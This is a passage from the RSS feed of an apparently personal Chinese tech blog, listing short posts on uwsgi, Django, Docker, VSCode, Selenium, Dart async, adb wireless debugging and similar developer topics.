      <description>1.配置 uwsgi  安装：pip install uwsgi 测试：uwsgi --http-socket :80 --file test.py  # test.py def application(env, start_response): start_response(&amp;#39;200 OK&amp;#39;, [(&amp;#39;Content-Type&amp;#39;,&amp;#39;text/html&amp;#39;)]) return [b&amp;#34;Hello World&amp;#34;]  配置文件：uwsgi.ini  [uwsgi] # 使用nginx连接时使用 # socket=0.0.0.0:8000 # 直接做web服务器, python manage.py runserver ip:port http=0.0.0.0:8000 # 路径为 0.0.0.0，表本地，使用127.0.0.1可能会无法从外网访问 # 项目目录 chdir=/home/mayanan/bj18/dailyfresh # 项目中wsgi.py文件的目录，相对于项目目录 wsgi-file=dailyfresh/wsgi.py # 指定启动的工作进程数 processes=4 # 指定工作进程中的线程数 threads=2 master=True # 保存启动后，主进程的pid pidfile=uwsgi.pid # 设置uwsgi后台运行, uwsgi.log保存日志信息 daemonize=uwsgi.log  启动：uwsgi --ini uwsgi.ini，uwsgi 通过 ini 文件启动后会在相同目录下生成一个 pid 文件，包含主进程的进程号 重载：uwsgi --reload uwsgi.</description>
    </item>
    
    <item>
      <title>VSCode(2)——底部状态栏</title>
      <link>https://ac-lm.github.io/posts/ide/vscode2%E5%BA%95%E9%83%A8%E7%8A%B6%E6%80%81%E6%A0%8F/</link>
      <pubDate>Fri, 27 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/ide/vscode2%E5%BA%95%E9%83%A8%E7%8A%B6%E6%80%81%E6%A0%8F/</guid>
      <description>1.改变颜色  在设置中搜索workbench.colorCustomizations 点击编辑setting.json  &amp;#34;workbench.colorCustomizations&amp;#34;: { &amp;#34;statusBar.background&amp;#34; : &amp;#34;#008cff&amp;#34;, &amp;#34;statusBar.noFolderBackground&amp;#34; : &amp;#34;#008cff&amp;#34;, &amp;#34;statusBar.debuggingBackground&amp;#34;: &amp;#34;#008cff&amp;#34; } </description>
    </item>
    
    <item>
      <title>Windows(6)——Python 环境变量不生效</title>
      <link>https://ac-lm.github.io/posts/windows10/windows6python-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8D%E7%94%9F%E6%95%88/</link>
      <pubDate>Fri, 27 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/windows10/windows6python-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8D%E7%94%9F%E6%95%88/</guid>
      <description>参考原文：命令窗口不能使用Python 
 问题 已在 Window10 上下载配置好 Python，但是在命令行 CMD 中使用 Python 命令时提示Python not found; run without arguments to install from the Microsoft Store，已确认 Python 的环境变量已配置。
解决 环境变量的优先级问题，WindowsApp 的路径优先于 Python，调换即好。</description>
    </item>
    
    <item>
      <title>随记(33)——网页截长图</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B033%E7%BD%91%E9%A1%B5%E6%88%AA%E9%95%BF%E5%9B%BE/</link>
      <pubDate>Fri, 27 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B033%E7%BD%91%E9%A1%B5%E6%88%AA%E9%95%BF%E5%9B%BE/</guid>
      <description>F12开发者工具 Ctrl+Shift+P打开命令查找窗口，输入截图或screenshot / Capture full size screenshot，查找截长图选项</description>
    </item>
    
    <item>
      <title>Django(12)——404 文件</title>
      <link>https://ac-lm.github.io/posts/django/django12404-%E6%96%87%E4%BB%B6/</link>
      <pubDate>Thu, 26 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/django/django12404-%E6%96%87%E4%BB%B6/</guid>
      <description>Django的404 Django 能自动的寻找 404 文件，在路径错误时自动跳转，需要注意的是，当 DEBUG = True 时，系统不会调用 404 文件。
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt; &amp;lt;title&amp;gt;404页面找不着了x&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h1&amp;gt;Error:404,页面找不到了&amp;lt;/h1&amp;gt; &amp;lt;h2&amp;gt;{{ request_path }}&amp;lt;/h2&amp;gt; &amp;lt;hr&amp;gt; &amp;lt;p&amp;gt;404页面名字不允许改变，必须为404.html，且必须放到/templates根目录下&amp;lt;/p&amp;gt; &amp;lt;hr&amp;gt; &amp;lt;a&amp;gt;500,400页面也类似&amp;lt;/a&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; </description>
    </item>
    
    <item>
      <title>Docker(4)——备份和恢复</title>
      <link>https://ac-lm.github.io/posts/docker/docker4%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/</link>
      <pubDate>Thu, 26 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/docker/docker4%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/</guid>
      <description>1.docker 容器的导出备份 docker export -o 容器导出文件(格式为tar压缩文件) 容器ID或容器名称 docker export -o $(pwd)/newtomcat.tar mytomcat ----------------------------------------------------- docker export 容器ID或容器名称 &amp;gt; 容器导出文件(格式为tar压缩文件) docker export mytomcat &amp;gt; $(pwd)/newtomcat.tar +++++++++++++++++++++++++++++++++++++++++++++++++++++ 注释： $(pwd)是docker支持的获取当前目录路径的方法，与linux的pwd类似 $(pwd)/newtomcat.tar 表示在当前目录下生成一个newtomcat.tar压缩文件 2.docker 容器的导入恢复 docker import 容器导出文件(格式为tar压缩文件) 新镜像名称[:版本号] docker import $(pwd)/newtomcat.tar newtomcat:v1.0 ------------------------------------------------------ docker import /URL 新镜像名称[:版本号] docker import http://example.com/exampleimage.tgz example/imagerepo 3.docker 镜像的导出备份 docker save -o 镜像导出文件(格式为tar压缩文件) 镜像ID或镜像名称[:版本号] docker save -o $(pwd)/mytomcat.tar newtomcat:v1.0 ---------------------------------------------------------------------- docker save 镜像ID或镜像名称[:版本号] &amp;gt; 镜像导出文件(格式为tar压缩文件) docker save newtomcat:v1.0 &amp;gt; $(pwd)/mytomcat.tar 4.</description>
    </item>
    
    <item>
      <title>VSCode(1)——Django 项目</title>
      <link>https://ac-lm.github.io/posts/ide/vscode1django-%E9%A1%B9%E7%9B%AE/</link>
      <pubDate>Thu, 26 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/ide/vscode1django-%E9%A1%B9%E7%9B%AE/</guid>
      <description>1.环境配置 IDE 运行环境需有 Python 与 Django
2.项目创建  在终端以命令 django-admin startproject XXXX 创建项目 在 VSCode 的扩展管理栏 Extensions 下载 Python 与 Django 插件 进入调试，添加 Python &amp;gt; Django 完成配置，启动项目  </description>
    </item>
    
    <item>
      <title>Web开发(13)——控制台输出</title>
      <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%9113%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA/</link>
      <pubDate>Thu, 26 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%9113%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA/</guid>
      <description>1.清空控制台 console.clear()clear()2.信息输出 console.log() 用于输出普通信息console.info() 用于输出提示性信息console.error() 用于输出错误信息console.warn() 用于输出警示信息console.debug() 用于输出调试信息3.换行 shift+ enter
4.占位符 支持字符（%s）、整数（%d或%i）、浮点数（%f）和对象（%o）四种
console.log(&#39;%d年%d月%d日&#39;,2011,3,26); console.log(&#39;圆周率是%f&#39;,3.1415926);5.断言 let isDebug = false;console.assert(isDebug,&#39;为false时输出的信息&#39;);</description>
    </item>
    
    <item>
      <title>Windows(5)——应用别名</title>
      <link>https://ac-lm.github.io/posts/windows10/windows5%E5%BA%94%E7%94%A8%E5%88%AB%E5%90%8D/</link>
      <pubDate>Thu, 26 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/windows10/windows5%E5%BA%94%E7%94%A8%E5%88%AB%E5%90%8D/</guid>
      <description>Road 设置—&amp;gt;应用—&amp;gt;应用和功能—&amp;gt;应用执行别名</description>
    </item>
    
    <item>
      <title>随记(32)——URL编码</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B032url-%E7%BC%96%E7%A0%81/</link>
      <pubDate>Thu, 26 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B032url-%E7%BC%96%E7%A0%81/</guid>
      <description>什么是UrlEncode UrlEncode 是一个函数，作用是将字符串以 URL 编码，是特定上下文的统一资源定位符（URL）的编码机制，最终使 HTML 数据安全提交。
函数会将字符串以URL编码，例如空格编码为加号，常规网页中的表单数据传送就是用 UrlEncode 编码后再送出。
部分转换规则如下：
   空格 ! # $ % + @ : = ?     %20 %21 %23 %24 %25 %2B %40 %3A %3D %3F    在ASP Server.URLEncode(&amp;quot;内容&amp;quot;)在PHP urlencode(&amp;quot;内容&amp;quot;);在JSP URLEncoder.encode(&amp;quot;要转码的内容&amp;quot;);在Python urllib.parse.unquote(&amp;quot;内容&amp;quot;)</description>
    </item>
    
    <item>
      <title>Flutter(23)——异步编程</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter23%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/</link>
      <pubDate>Wed, 25 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter23%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/</guid>
      <description>参考原文：Flutter 异步编程：Future、Isolate 和事件循环
 1.Dart 是一种单线程语言 Dart 是一种单线程语言，意味着同一时刻程序只能执行一个操作，其他操作在这个操作完成后执行，只要这个操作还在执行，它就不会被其他 Dart 代码中断。依赖于 Dart 的 Flutter 也是如此。
void myBigLoop(){ for (int i = 0; i &amp;lt; 1000000; i++){ _doSomethingSynchronously(); } } 在上述例子中，myBigLoop() 方法在执行完成前永远不会被中断，在整个方法执行期间应用将会被阻塞。
2.运行模型 在这里需要关注的是 Dart 的代码序列器（事件循环）。
当你启动一个 Flutter 或 Dart 应用时，应用将创建并启动一个新的线程进程 Isolate，这个线程将是整个应用的主线程。
在主线程启动后，应用会在此初始化 2 个 FIFO（先进先出）队列，MicroTask和 Event队列，在上述操作执行完成后，才会执行main()方法，并启动事件循环。
事件循环是一种由一个内部时钟控制的无限循环，在每个时钟周期内，如果没有其他 Dart 代码执行，则执行以下操作：
void eventLoop(){ while (microTaskQueue.isNotEmpty){ fetchFirstMicroTaskFromQueue(); executeThisMicroTask(); return; } if (eventQueue.isNotEmpty){ fetchFirstEventFromQueue(); executeThisEventRelatedCode(); } } 可以注意到，这个操作的作用是从MicroTask和 Event队列提取出事件到循环中执行，直到两个队列中所有事件执行完成。
a.MicroTask 队列 MicroTask队列用于非常简短且需要异步执行的内部动作，这些动作需要在其他事件完成之后并在将执行权送还给Event队列之前运行。
b.Event 队列 大多数需要使用异步的动作都使用Event队列进行处理，如外部事件 I/O，绘图等。值得注意的是，Future 操作也通过Event队列处理。</description>
    </item>
    
    <item>
      <title>Docker(3)——设置国内镜像源</title>
      <link>https://ac-lm.github.io/posts/docker/docker3%E8%AE%BE%E7%BD%AE%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E6%BA%90/</link>
      <pubDate>Wed, 18 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/docker/docker3%E8%AE%BE%E7%BD%AE%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E6%BA%90/</guid>
      <description>修改配置文件 创建或修改 /etc/docker/daemon.json 文件
{ &amp;#34;registry-mirrors&amp;#34;: [&amp;#34;https//hub-mirror.c.163.com&amp;#34;] }  Docker中国区官方镜像：https://registry.docker-cn.com 网易：http://hub-mirror.c.163.com 中国科技大学 ：https://docker.mirrors.ustc.edu.cn 上述镜像似乎已过期，不建议使用  </description>
    </item>
    
    <item>
      <title>Docker(2)——后台运行</title>
      <link>https://ac-lm.github.io/posts/docker/docker2%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C/</link>
      <pubDate>Tue, 17 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/docker/docker2%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C/</guid>
      <description>1.使用参数 -d docker run -d python bash 需要注意的是，docker 在后台运行时，必须有一个前台进程。如果这个进程运行的命令不是能一直挂起的命令（如 ping，sleep），那么在执行完命令后，进程就会退出，同时 docker 也就会停止。
2.解决方法 1.执行挂起阻塞命令 docker run -d python sleep 99999999999999 2.使用交互界面后退出容器 docker run -it python /bin/bash </description>
    </item>
    
    <item>
      <title>Docker(1)——Bash 命令</title>
      <link>https://ac-lm.github.io/posts/docker/docker1bash-%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Mon, 16 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/docker/docker1bash-%E5%91%BD%E4%BB%A4/</guid>
      <description>1.运行 docker docker version # 查看docker版本 systemctl start docker # 运行docker systemctl status docker # 查看docker状态 systemctl enable docker # 自启动docker 2.查看容器 docker ps -a # 查看容器，包括未运行 docker ps # 查看容易，正在运行的 docker rm name # 删除 docker rm -f name # 强制删除 docker rm $(docker ps -aq) # 删除全部容器  docker inspect -f {{&amp;#34;.NetworkSettings.IPAddress&amp;#34;}} python3.9 3.启动容器 docker run --name python3.9 --privileged=true -v /root/pythonScript:/pythonScript -it python /bin/bash # name 名字，privileged 权限，-v 挂载目录，-it 以shell模式 docker rename gallant_swartz python3.</description>
    </item>
    
    <item>
      <title>随记(31)——M3U8文件</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B031m3u8-%E6%96%87%E4%BB%B6/</link>
      <pubDate>Thu, 05 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B031m3u8-%E6%96%87%E4%BB%B6/</guid>
      <description>参考原文：m3u8到底是什么格式？ @星选酷 
 1.视频播放的过程 要了解 m3u8 文件格式，首先要了解现在视频播放的过程。现在的视频网站采用的是流媒体传输协议，就是将一段视频分割成无数个小段，每一个小段就是一个 ts 格式的视频文件，然后传输到视频网站上一段一段的播放。这样做的好处是能使用户观看更加流畅，因为在观看过程中网站会根据网络状况自动切换视频的清晰度，下载不同分辨率的 ts 视频文件，在网络状况不稳定的情况下，对保障流畅播放非常有帮助。
 服务器采集编码传输视频到切片器 切片器对视频创建索引文件，并且切割成n个ts文件 这2个文件传输到http服务器上 网站/客户端根据索引文件查找http服务器上的ts文件，连续播放这n个ts文件，就可以了。  这个索引文件就是 M3U8 ，索引文件里面存储着 ts 文件的网络 url 链接，网站需要拿到索引文件，按照 url 链接下载在 http 服务器中的 ts文件，类似于爬虫，所有 ts 文件顺序播放，就完成了整个视频的播放。
扩展阅读 M3U（Moving Picture Experts Group Audio Layer 3 Uniform Resource Locator）是音频文件的列表文件，是纯文本文件，记录着视频资源的网络地址。
M3U8 就是 M3U 的 UTF-8 格式文件</description>
    </item>
    
    <item>
      <title>随记(30)——多进程与多线程与协程</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B030%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%8D%8F%E7%A8%8B/</link>
      <pubDate>Wed, 04 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B030%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%8D%8F%E7%A8%8B/</guid>
      <description> 参考原文：多进程，多线程，协程的理解_@qq_43279936 
 1.什么是进程？什么是线程？   进程是表示资源分配的基本单位，是调度运行的基本单位。当用户运行自己的程序时，系统就创建一个进程，并为它分配包括内存空间、磁盘空间、I/O设备等资源。然后，把该进程放入进程的就绪队列中等待被系统执行。当该进程被系统的进程调度程序选中后，系统会为它分配CPU以及其它资源，运行该进程。
  线程是进程中执行运算的最小单位，如果把进程理解为在逻辑上操作系统所完成的任务，那么线程表示完成该任务的许多可能的子任务之一。线程与进程的包含关系如下图所示。
  2.多进程和多线程的区别？ a.数据共享、同步  多进程：不共享数据，数据交换需要用IPC(进程间通信)，数据因此同步简单 多线程：共享进程数据，数据处理交换方便，数据因此同步复杂  b.内存、CPU  多进程：占用内存多，切换复杂，CPU利用率低 多线程：占用内存少，切换简单，CPU利用率高  c.创建销毁、切换  多进程：创建销毁、切换复杂，速度慢 多线程：创建销毁、切换简单，速度快  d.编程、调试  多进程：编程简单，调试简单 多线程：编程复杂，调试复杂  e.可靠性  多进程：进程间互不影响，一个进程挂了，程序也不会整个挂掉 多线程：线程影响着进程，一个线程挂掉，将导致整个进程挂掉  3.进程间或线程间的通信方式  进程：管道， 信号量， 信号， 消息队列， 共享内存， 套接字 线程：锁机制（互斥锁、条件变量、读写锁），信号量机制(Semaphore)，信号机制(Signal)  4.什么是协程 协程(Coroutine)，又称微线程，纤程，是单线程语言中用来模拟多线程的一种方式。协程的作用，是在执行部分耗时长的函数时，可以先中断执行，去处理其他耗时短的函数，等到空闲时再继续执行该耗时长的函数，最终使得这一整个过程看上去像多线程。
5.协程优势  执行效率极高，因为子程序切换(函数)不是线程切换，仅仅是函数的切换，没有切换线程的开销。所以与多线程相比，线程的数量越多，协程性能的优势越明显。 不需要多线程的锁机制，因为是单线程，所以不存在同时写变量冲突，在控制共享资源时也不需要加锁，因此执行效率高很多。  </description>
    </item>
    
    <item>
      <title>Android(4)—华为设备启动无线调试</title>
      <link>https://ac-lm.github.io/posts/android/android4%E5%8D%8E%E4%B8%BA%E8%AE%BE%E5%A4%87%E5%90%AF%E5%8A%A8%E6%97%A0%E7%BA%BF%E8%B0%83%E8%AF%95/</link>
      <pubDate>Tue, 03 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/android/android4%E5%8D%8E%E4%B8%BA%E8%AE%BE%E5%A4%87%E5%90%AF%E5%8A%A8%E6%97%A0%E7%BA%BF%E8%B0%83%E8%AF%95/</guid>
      <description>华为默认不启动无线调试，用户需要进入生产模式，手动启动
1.生产模式的启用  拨号界面中输入*#*#2846579#*#*，进入工程菜单，将调试模式变更为生产模式 计算器界面中输入()()2846579()()，进入工程菜单，将调试模式变更为生产模式  2.启动无线调试功能  使用 USB 连接手机，将无线端口开启  adb tcpip 5555使用同一网络环境的 Wifi 连接  adb connect 手机IP:5555成功后断开USB，此时便可以在 adb 中查看到连接手机  adb devices</description>
    </item>
    
    <item>
      <title>随记(29)——Xml可扩展标记语言</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B029xml-%E5%8F%AF%E6%89%A9%E5%B1%95%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/</link>
      <pubDate>Tue, 03 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B029xml-%E5%8F%AF%E6%89%A9%E5%B1%95%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/</guid>
      <description>XML 是纯文本格式，在许多方面类似于 HTML。XML 由 XML 元素组成，每个 XML 元素包括一个开始标记 &amp;lt;&amp;gt; ，一个结束标记 &amp;lt;/&amp;gt; 以及两个标记之间的内容。标记是对文档存储格式和逻辑结构的描述，可以包括注释、引用、字符数据段、起始标记、结束标记、空元素、文档类型声明 ( DTD ) 和序言。
编写规则  必须有声明语句，作为 XML 文档的第一句，其格式如下：  &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34;?&amp;gt; 区分大小写  在XML文档中，大小写是有区别的。A 和 a 是不同的标记。因此注意在写元素时，前后标记的大小写要保持一致。
XML文档有且只有一个根元素  标准格式的 XML 文档有且仅有一个根元素，紧接着声明后面建立，其他元素都是这个根元素的子元素，根元素完全包括文档中其他所有的元素。根元素的起始标记要放在所有其他元素的起始标记之前，根元素的结束标记要放在所有其他元素的结束标记之后。
属性值使用引号  在HTML代码里面，属性值可以加引号，也可以不加。但是XML规定，所有属性值必须加引号，否则将被视为错误。
所有的标记必须有相应的结束标记  在HTML中，标记可以不成对出现，而在XML中，所有标记必须成对出现，有一个开始标记，就必须有一个结束标记，否则将被视为错误。
所有的空标记也必须被关闭  在XML中，规定所有的标记必须有结束标记。
示例 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34;?&amp;gt; &amp;lt;manifest xmlns:android=&amp;#34;http://schemas.android.com/apk/res/android&amp;#34; package=&amp;#34;osg.AndroidExample&amp;#34; android:installLocation=&amp;#34;preferExternal&amp;#34; android:versionCode=&amp;#34;1&amp;#34; android:versionName=&amp;#34;1.0&amp;#34;&amp;gt; &amp;lt;uses-sdk android:targetSdkVersion=&amp;#34;8&amp;#34; android:minSdkVersion=&amp;#34;8&amp;#34;&amp;gt;&amp;lt;/uses-sdk&amp;gt; &amp;lt;uses-feature android:glEsVersion=&amp;#34;0x00020000&amp;#34;/&amp;gt; &amp;lt;uses-permission android:name=&amp;#34;android.permission.INTERNET&amp;#34;/&amp;gt; &amp;lt;application android:label=&amp;#34;@string/app_name&amp;#34; android:icon=&amp;#34;@drawable/osg&amp;#34;&amp;gt; &amp;lt;activity android:name=&amp;#34;.osgViewer&amp;#34; android:label=&amp;#34;@string/app_name&amp;#34; android:screenOrientation=&amp;#34;landscape&amp;#34;&amp;gt; &amp;lt;intent-filter&amp;gt; &amp;lt;action android:name=&amp;#34;android.</description>
    </item>
    
    <item>
      <title>Python(33)——selenium expected_conditions 的使用</title>
      <link>https://ac-lm.github.io/posts/python/python33selenium-expected_conditions-%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Fri, 30 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python33selenium-expected_conditions-%E4%BD%BF%E7%94%A8/</guid>
      <description>参考原文：selenium expected conditions 使用实例 @乙醇 
 1.support.expected_conditions Expected Conditions 是 selenium 提供的断言工具，通常使用场景有2种
 直接在断言中使用 与 WebDriverWait 配合使用，动态等待页面上元素出现或者消失  2.方法    函数名 描述     title_contains 判断当前页面的 title 是否包含预期字符串   title_is 判断当前页面的 title 是否精确等于预期   presence_of_element_located 判断某个元素是否被加到了 DOM 树里，并不代表该元素一定可见   visibility_of_element_located 判断某个元素是否可见，可见代表元素非隐藏，并且元素的宽和高都不等于 0   presence_of_all_elements_located 判断是否至少有 1 个元素存在于 DOM 树中   text_to_be_present_in_element 判断某个元素中的 text 是否包含了预期的字符串   text_to_be_present_in_element_value 判断某个元素中的 value 属性是否包含了预期的字符串   frame_to_be_available_and_switch_to_it 判断该 frame 是否可以切换进去，如果可以则返回 True 并切换进去，否则返回 False   invisibility_of_element_located 判断某个元素中是否不存在于 DOM 树或不可见   element_to_be_clickable 判断某个元素中是否可见并且是 enable 可操作的   staleness_of 判断某个元素是否从 DOM 树中移除   element_to_be_selected 判断某个元素是否被选中了，一般用在下拉列表   element_located_selection_state_to_be 判断某个元素的选中状态是否符合预期   alert_is_present 判断页面上是否存在 alert    3.</description>
    </item>
    
    <item>
      <title>Python(32)——selenium 下拉框( select )的处理</title>
      <link>https://ac-lm.github.io/posts/python/python32selenium-%E4%B8%8B%E6%8B%89%E6%A1%86-select-%E5%A4%84%E7%90%86/</link>
      <pubDate>Thu, 29 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python32selenium-%E4%B8%8B%E6%8B%89%E6%A1%86-select-%E5%A4%84%E7%90%86/</guid>
      <description>1.select 在HTML中 &amp;lt;select&amp;gt;标签可用于创建单选或多选菜单。
&amp;lt;select&amp;gt; &amp;lt;option value=&amp;#34;a&amp;#34;&amp;gt;AA&amp;lt;/option&amp;gt; &amp;lt;option value=&amp;#34;b&amp;#34;&amp;gt;BB&amp;lt;/option&amp;gt; &amp;lt;option value=&amp;#34;c&amp;#34;&amp;gt;CC&amp;lt;/option&amp;gt; &amp;lt;option value=&amp;#34;d&amp;#34;&amp;gt;DD&amp;lt;/option&amp;gt; &amp;lt;option value=&amp;#34;e&amp;#34;&amp;gt;EE&amp;lt;/option&amp;gt; &amp;lt;/select&amp;gt; 2.操作 from selenium.webdriver.support.select import Select    方法 说明     select_by_index() 通过索引定位   select_by_value() 通过value值定位   select_by_visible_text() 通过文本值定位   deselect_all() 取消所有选项   deselect_by_index() 取消对应index选项   deselect_by_value() 取消对应value选项   deselect_by_visible_text() 取消对应文本选项   first_selected_option() 返回第一个选项   all_selected_options() 返回所有的选项   options() 返回所以的选择项   all_selected_options() 返回所以已选中的选择项   first_selected_option() 返回选中的第一个选择项    3.</description>
    </item>
    
    <item>
      <title>Django(11)——setting 文件</title>
      <link>https://ac-lm.github.io/posts/django/django11setting-%E6%96%87%E4%BB%B6/</link>
      <pubDate>Tue, 27 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/django/django11setting-%E6%96%87%E4%BB%B6/</guid>
      <description>1.setting.py 配置文件  BASE_DIR：即为项目所在目录，__file__可以获得当前文件的路径。 SECRET_KEY：一个特殊的 Django 安装的密钥，每当使用Django-admin startproject时会自动生成一个。 DUBUG：默认值为 FALSE，当选择 TRUE 时，当我们的项目出错时可以使我们看到出错信息，但是为了防止被用户看到或者他人攻击，在项目上线后应改为 FALSE。 ALLOWED_HOSTS：默认值是一个空列表，列表中的值为哪些域名可以访问我们的 Django 项目。 INSTALLED_APPS：安装的 APP 列表，Django 为我们默认添加了一些自带的项目，每个新创建的 APP 都要加入这个列表才可以被使用。 MIDDLEWARE：这是将要使用的中间件列表。 ROOT_URLCONF：表示根 URLconf 的完整 Python 导入路径。 TEMPLATES：模板文件配置。 WSGI_APPLICATION：配置 Django 项目的 WSGI 服务路径。 DATABASES：Django 的数据库设置，Django 默认的是 sqlite3 数据库。ENGINE 是选择对应我们选择的数据库的引擎，NAME 是数据库名称，HOST 是连接数据库所要用到的主机，还有 PORT 选择端口等许多选项。 AUTH_PASSWORD_VALIDATORS：用于检查用户密码强度的验证器列表，在为空的情况下就接受任意强度的用户密码。 LANGUAGE_CODE：Django 项目的语言代码，默认值为 en-us，值 zh-hans 汉语。 TIME_ZONE：时区，默认值是 UTC。当 USE_TZ 为 TRUE 时，无论 TZ 设置为何值 Django 都会使用系统默认的时区，例如要使用上海的时区则需将 USE_TZ=FALSE，TIME_ZONE=&amp;lsquo;Asia/Shanghai&amp;rsquo;。 USE_I18N：国际化，Django 允许开发者指定要翻译的字符串，也可以让访问者进行语言选择。 USE_L10N：是否选择启用数据的本地化。 USE_TZ：如果开启了 Time Zone 功能，则所有的存储和内部处理，甚至包括直接 print 显示全都是UTC的。只有通过模板进行表单输入/渲染输出的时候，才会执行 UTC 本地时间的转换。 STATIC_URL：静态目录的所有文件，存放 css，js 等文件。 STATICFILES_DIRS：static 文件的路径。 MEDIA_URL：与 STATIC_URL 类似，存放用户上传的文件。  2.</description>
    </item>
    
    <item>
      <title>Django(10)——auth 用户认证模块</title>
      <link>https://ac-lm.github.io/posts/django/django10auth-%E7%94%A8%E6%88%B7%E8%AE%A4%E8%AF%81%E6%A8%A1%E5%9D%97/</link>
      <pubDate>Mon, 26 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/django/django10auth-%E7%94%A8%E6%88%B7%E8%AE%A4%E8%AF%81%E6%A8%A1%E5%9D%97/</guid>
      <description>1.介绍 Django 内置了强大的用户认证系统auth，它默认创建并使用auth_user表来存储用户数据。
from django.contrib import auth # 使用auth认证系统 from django.contrib.auth.models import User # auth认证系统默认使用User表 2.auth.authenticate() Django 提供简单的用户认证功能，如果认证成功（用户名和密码正确有效），便会返回一个User对象。
from django.contrib import auth user_obj = auth.authenticate(username=username,password=pwd) 3.auth.login(request, user) 该函数实现一个用户登录的功能，它本质上会在后端为该用户生成相关 session 数据。在使用login(request, user_obj)登录后之后，便可以通过request.user拿到当前登录的用户对象，否则request.user得到的是一个匿名用户对象。
from django.shortcuts import render, HttpResponse, redirect from django.contrib import auth def login(request): if request.method == &amp;#34;POST&amp;#34;: username = request.POST.get(&amp;#39;username&amp;#39;) pwd = request.POST.get(&amp;#39;password&amp;#39;) # 调用auth模块的认证方法，判断用户名和密码是否正确，正确返回一个user_obj user_obj = auth.authenticate(username=username, password=pwd) if user_obj: # 登录成功,设置Session数据 auth.login(request, user_obj) return HttpResponse(&amp;#39;登录成功&amp;#39;) else: return render(request, &amp;#39;login.</description>
    </item>
    
    <item>
      <title>Django(9)——CSRF中间件</title>
      <link>https://ac-lm.github.io/posts/django/django9csrf-%E4%B8%AD%E9%97%B4%E4%BB%B6/</link>
      <pubDate>Sun, 25 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/django/django9csrf-%E4%B8%AD%E9%97%B4%E4%BB%B6/</guid>
